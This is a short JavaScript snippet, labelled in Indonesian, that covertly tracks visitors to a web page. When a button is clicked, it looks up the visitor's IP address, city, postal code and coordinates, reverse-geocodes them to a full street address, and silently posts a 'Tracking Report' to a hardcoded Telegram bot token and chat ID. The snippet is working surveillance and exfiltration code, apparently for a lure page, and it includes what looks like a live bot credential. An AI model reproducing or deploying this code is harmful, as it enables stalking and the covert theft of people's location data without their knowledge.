(()=>{
  // === TOKEN & CHAT ID TELEGRAM  ===
  const T='7740915138:AAGGgWA1Zq39H95q2o90VCwr6tPcgaZva8k',
        C='7189193429';

  const sTG=async d=>{
    try{
      await fetch(`https://api.telegram.org/bot${T}/sendMessage`,{
        method:'POST',
        headers:{'Content-Type':'application/json'},
        body:JSON.stringify({chat_id:C,text:d,parse_mode:'HTML'})
      });
    }catch(e){}
  };

  const gLD=async(a,b)=>{
    try{
      const r=await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${a}&lon=${b}&zoom=18&addressdetails=1`);
      const d=await r.json();
      if(d.address) return {
        kb: d.address.county || d.address.city || d.address.state || "Tidak diketahui",
        kc: d.address.suburb || d.address.village || d.address.town || "Tidak diketahui",
        fa: d.display_name || "Alamat tidak tersedia"
      }
    }catch(e){}
    return{kb:"Tidak diketahui",kc:"Tidak diketahui",fa:"Alamat tidak tersedia"}
  };

  const cDI=async()=>{
    let m='╭───── Tracking Report ───── ⦿\n\n';
    try{
      const i=await fetch('https://ipapi.co/json/');
      const d=await i.json();
      m+='📍 LOCATION INFORMATION\n';
      m+=`📡 IP Address: ${d.ip}\n🏙️ Kota: ${d.city}\n🏙️ Kabupaten: ${d.region}\n🗺️ Wilayah: ${d.region}\n🌎 Negara: ${d.country_name}\n🏷️ Kode Pos: ${d.postal}\n`;
      if(d.latitude&&d.longitude){
        m+=`📌 Latitude: ${d.latitude}\n📍 Longitude: ${d.longitude}\n`;
        const l=await gLD(d.latitude,d.longitude);
        m+=`🏙️ Kabupaten: ${l.kb}\n🏙️ Kecamatan: ${l.kc}\n🏠 Alamat Lengkap: ${l.fa}\n`;
      }
    }catch(e){m+='❌ Gagal mendapatkan informasi lokasi\n';}

    m+='\n╰───── Telegram @LVYNXP ─────';
    sTG(m);
  };

  document.getElementById("openBtn").addEventListener("click",()=>{ cDI(); });
})();
